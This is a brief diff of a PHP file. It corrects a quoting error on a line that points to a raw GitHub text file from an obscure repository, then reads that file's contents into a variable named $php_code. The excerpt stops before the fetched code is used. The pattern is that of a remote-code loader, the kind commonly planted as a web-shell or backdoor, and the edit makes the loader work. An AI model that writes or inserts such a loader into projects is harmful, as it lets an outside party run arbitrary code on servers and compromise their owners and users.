@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/alpamerha.txt'';
+$url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/alpamerha.txt';
 
 
 $php_code = file_get_contents($url);
